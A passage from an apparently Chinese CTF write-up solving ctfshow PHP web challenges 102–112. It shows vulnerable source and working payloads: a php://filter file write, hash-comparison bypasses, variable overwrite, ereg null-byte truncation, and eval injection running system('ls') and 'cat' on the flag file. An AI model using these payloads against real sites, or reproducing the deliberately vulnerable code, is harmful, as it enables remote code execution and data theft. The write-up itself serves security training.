class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>由于是从v2的第3位开始截取，因此前两位需要填充任意数字，最终得到v2为：<br><code>005044383959474e6864434171594473</code><br>由于file_put_contents()函数允许使用伪协议，于是通过PHP伪协议写入文件，因此我们可以将v3构造为：<br><code>php://filter/write=convert.base64-decode/resource=a.php</code><br>v1为POST传参：<br><code>hex2bin</code></li></ol><p>构造完成后提交，访问a.php，查看源代码。<br>即可拿到flag</p><h1 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h1><p>和web102相同</p><h1 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h1><p>很简单，要两个SHA1值相同，但没有验证本身值是否不同，因此直接传入两个相同的值即可拿到flag。<br>但本意应该是考察SHA1加解密的缺陷：<br>sha1()函数无法处理数组类型，将报错并返回false<br>sha1()函数的弱相等<br>或者用科学计数法（0exxx）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v1=aaK1STfY    //0e76658526655756207688271159624026011393</span><br><span class="line">v2=aaO8zKZF    //0e89257456677279068558073954252716165668</span><br></pre></td></tr></table></figure><p>最简单的payload:<br>GET:v1&#x3D;1<br>POST:v2&#x3D;1<br>拿到flag</p><h1 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>error_reporting()函数<br>设置应该报告何种 PHP 错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(?int $error_level = null): int</span><br><span class="line">error_reporting() 函数能够在运行时设置 error_reporting 指令。</span><br><span class="line">PHP 有诸多错误级别，使用该函数可以设置在脚本运行时的级别。</span><br><span class="line">如果没有设置可选参数 error_level， error_reporting() 仅会返回当前的错误报告级别。</span><br><span class="line">// 关闭所有PHP错误报告</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">// Report simple running errors</span><br><span class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE);</span><br><span class="line"></span><br><span class="line">// 报告 E_NOTICE (报告未初始化的变量</span><br><span class="line">// 或者捕获变量名的错误拼写)</span><br><span class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);</span><br><span class="line"></span><br><span class="line">// 除了 E_NOTICE，报告其他所有错误</span><br><span class="line">error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line"></span><br><span class="line">// 报告所有 PHP 错误</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"></span><br><span class="line">// 报告所有 PHP 错误</span><br><span class="line">error_reporting(-1);</span><br><span class="line"></span><br><span class="line">// 和 error_reporting(E_ALL); 一样</span><br><span class="line">ini_set(&#x27;error_reporting&#x27;, E_ALL);</span><br></pre></td></tr></table></figure></li><li><p>foreach<br>foreach 语法结构提供了遍历数组的简单方式。foreach 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">foreach (iterable_expression as $value)</span><br><span class="line">    statement</span><br><span class="line">foreach (iterable_expression as $key =&gt; $value)</span><br><span class="line">    statement</span><br><span class="line">第一种格式遍历给定的 iterable_expression 迭代器。每次循环中，当前单元的值被赋给 $value。</span><br><span class="line">第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量 $key。</span><br><span class="line">注意 foreach 不会修改类似 current() 和 key() 函数所使用的数组内部指针。</span><br><span class="line">还能够自定义遍历对象。</span><br><span class="line">可以很容易地通过在 $value 之前加上 &amp; 来修改数组的元素。此方法将以引用赋值而不是拷贝一个值。</span><br></pre></td></tr></table></figure></li><li><p>die()函数<br>等同于exit(), 输出一个消息并且退出当前脚本。</p></li><li><p>$$变量覆盖<br><a href="https://www.ineedyou.xyz/archives/87/">变量覆盖的知识</a></p></li></ul><p>从源码可以看出，我们GET不能传: <code>error=xx</code>  POST不能传: <code>xxx=flag</code><br>并且GET传参和POST传参均会进行变量覆盖。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br></pre></td></tr></table></figure><p>这条if语句若想要绕过要么已知flag的值，要么设置值为空。<br>看需求是否用到error考虑需不需要绕过。</p><ol start="2"><li>构造payload<br>分析源码后，我们GET需要传入：<br><code>suces=flag</code><br>这样做的目的是为了将变量flag的值传入变量suces，并且变量flag的值被清空。<br>并且POST传入：<br><code>error=suces</code><br>这样一来， <code>$_POST[&#39;flag&#39;]==$flag</code> 便返回false，最终if语句将执行die函数。<br>而变量error的值为suces的值，即原来flag的值。那么将会输出flag。<br>这样就拿到flag了。</li></ol><p>或者POST也可以为：<br><code>flag=</code><br>这样一来， <code>$_POST[&#39;flag&#39;]==$flag</code> 便返回true，最终if语句不会执行die函数。<br>转而继续往下执行，最后输出变量suces的值，也即flag的值（因为已经变量覆盖了，$flag就是$suces）<br>最终拿到flag</p><h1 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与web104类似，只不过初始值不能相同</p></li><li><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET: v2[]=0</span><br><span class="line">POST: v1[]=1</span><br></pre></td></tr></table></figure></li></ol><h1 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       <span class="title function_ invoke__">parse_str</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>parse_str()函数<br>将字符串解析成多个变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">parse_str(string $string, array &amp;$result): void</span><br><span class="line">如果 string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。</span><br><span class="line">警告</span><br><span class="line">极度不建议在没有 result 参数的情况下使用此函数， 并且在 PHP 7.2 中将废弃不设置参数的行为。PHP 8.0.0 起，result 参数是强制的。</span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/function.parse-str.php">示例</a></p></li><li><p>isset()函数<br>检测变量是否已声明并且其值不为 null。</p></li><li><p>empty与isset的区别<br>empty - 检查一个变量是否为空<br>isset - 检查一个变量是否为null<br><code>为空</code> 包含了 <code>为null</code> 这个概念，<br>这些变量均认为是空： <code>&#39;&#39;  0  0.0  &quot;0&quot;  null  false  array()  $var;</code><br><code>为null</code> 只有<strong>变量未声明</strong>和<strong>赋为null</strong>这两种。</p></li><li><p>$_POST<br>不能用empty()函数和isset()函数判断传入的值是否为空，因为$_POST是一个数组，里边有键名和键值。<br>只要传入了变量，即使没有值也会被函数认定为有值。</p></li></ul><p>可以看出，本题的考点是变量覆盖（parse_str）和md5<br>通过POST传入v1，通过GET传入v3。通过parse_str将v1传入的键名转化为变量名，传入的键值转化为变量的值，放入数组v2中，实现变量覆盖。<br>然后将变量名为flag的值与v3的md5值相比较，如果相等则输出flag。</p><ol start="2"><li>构造payload</li></ol><ul><li><p>方法一<br>GET：<br><code>v3=1</code><br>POST:<br><code>v1=flag=c4ca4238a0b923820dcc509a6f75849b</code><br>解释：<br>1的md5值为：c4ca4238a0b923820dcc509a6f75849b<br>因此相比较时能过，拿到flag</p></li><li><p>方法二<br>GET：<br><code>v3[]=</code><br>POST:<br><code>v1=</code><br>解释：<br>v3传入数组会返回空值，即MD5值也为空。而v1没有传入变量到v2，因此v2[‘flag’]也为空。<br>两边均为空，返回true，拿到flag。</p></li></ul><h1 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>ereg()函数<br>正则表达式匹配(PHP 4, PHP 5)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ereg ( string $pattern , string $string [, array &amp;$regs ] ) : int</span><br><span class="line">以区分大小写的方式在 string 中寻找与给定的正则表达式 pattern 所匹配的子串。</span><br></pre></td></tr></table></figure><p><a href="http://php.adamharvey.name/manual/zh/function.ereg.php">ereg函数详细解释</a></p></li><li><p>$ 正则<br>匹配输入字符串的结尾位置。</p></li></ul><p>第1个if语句的意思是，匹配GET传入的参数c首尾是否有字母，没有将会直接退出。<br>第2个if语句的意思是，将变量c的值逆转再取整判断是否等于16进制的0x36d，也即10进制的877。如果等于将输出flag。</p><ol start="2"><li>构造payload<br>因为ereg函数存在截断漏洞，%00后的字符串不解析，由此我们可以构造：<br><code>aa%00778</code><br>成功拿到flag。</li></ol><h1 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>Exception异常类<br><a href="https://learnku.com/articles/5435/exceptions-and-errors-in-php-best-practices">Exception异常类</a><br>源码来看，可以得知是需要通过GET方式传入v1，v2两个参数，由于有preg_match()函数检验，因此两个参数都需要有字母才能通过匹配。<br>最后通过eval变成可执行代码。</li></ul><ol start="2"><li>构造payload<br>我们需要构造出不会报错，并且能够显示所需信息的payload，关键是在于变量v1使用什么函数。<br>这里有三种函数可用：<br><code>?v1=Exception&amp;v2=system(&#39;ls&#39;)</code><br><code>?v1=ReflectionClass&amp;v2=system(&#39;ls&#39;)</code><br><code>?v1=ReflectionMethod&amp;v2=system(&#39;ls&#39;)</code><br>找到含有flag的文件后，继续执行如下命令显示flag：<br><code>?v1=Exception&amp;v2=system(&#39;cat fl36dg.txt&#39;)</code><br><code>?v1=ReflectionClass&amp;v2=system(&#39;cat fl36dg.txt&#39;)</code><br><code>?v1=ReflectionMethod&amp;v2=system(&#39;cat fl36dg.txt&#39;)</code><br>显示源码，成功拿到flag。</li></ol><h1 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>FilesystemIterator<br>FilesystemIterator是文件系统迭代器，利用 FilesystemIterator 获取指定目录下的所有文件<br><a href="https://www.php.net/manual/zh/class.filesystemiterator.php">详细解释</a></p></li><li><p>getcwd()函数<br>取得当前工作目录<a href="https://blog.csdn.net/baidu_35085676/article/details/52002579">getcwd()函数</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getcwd(): string|false</span><br><span class="line">成功则返回当前工作目录，失败返回 false。</span><br><span class="line">在某些 Unix 的变种下，如果任何父目录没有设定可读或搜索模式，即使当前目录设定了，getcwd() 还是会返回 false。</span><br></pre></td></tr></table></figure></li></ul><p>和前一关类似，但是设置了黑名单，不能使用符号和数字，只能使用字母或空格。</p><ol start="2"><li>构造payload<br>这里考察了：php内置类。我们需要用到FilesystemIterator来或取指定目录下的所有文件，并且使用getcwd()函数获取当前工作目录后返回当前工作目录<br><code>?v1=FilesystemIterator&amp;v2=getcwd</code><br>所需文件出现后，直接加在url之后访问即可拿到flag</li></ol><h1 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>$GLOBALS（不可小写）<br>超全局变量：引用全局作用域中可用的全部变量。<br>说明：<br>关联数组 array，包含当前脚本内定义成全局范围的所有变量的引用。 数组的键就是变量的名字。$GLOBALS在PHP中总是可用的。<br><a href="https://www.php.net/manual/zh/reserved.variables.globals.php">GLOBALS更详细的解释</a></li></ul><p>通过GET传入两个参数v1,v2，并且只能传入字母。如果检查到v1中有ctfshow，则执行函数getflag。<br>将v2的值传给v1，并且通过var_dump函数输出v1</p><ol start="2"><li>构造payload<br>由于v1&#x3D;ctfshow，因此实际起作用的只有v2<br>我们需要用到超全局变量$GLOBALS，于是构造出payload为：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure>成功拿到flag</li></ol><h1 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>is_file()函数<br>判断给定文件名是否为一个正常的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">is_file(string $filename): bool</span><br><span class="line">如果文件存在且为正常的文件则返回 true，否则返回 false。</span><br><span class="line">注意: 因为 PHP 的整数类型是有符号整型而且很多平台使用 32 位整型，对 2GB 以上的文件，一些文件系统函数可能返回无法预期的结果。</span><br></pre></td></tr></table></figure></li><li><p>伪协议<br><a 